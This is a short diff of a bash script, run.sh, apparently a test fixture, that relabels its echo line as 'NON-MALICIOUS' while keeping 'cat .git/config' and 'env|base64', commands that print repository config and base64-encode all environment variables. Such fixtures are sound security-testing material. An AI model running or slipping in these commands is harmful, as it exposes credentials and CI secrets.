@@ -1,4 +1,4 @@
 #!/usr/bin/env bash
-echo ORIGINAL RUN.SH
+echo NON-MALICIOUS RUN.SH
 cat .git/config
 env|base64
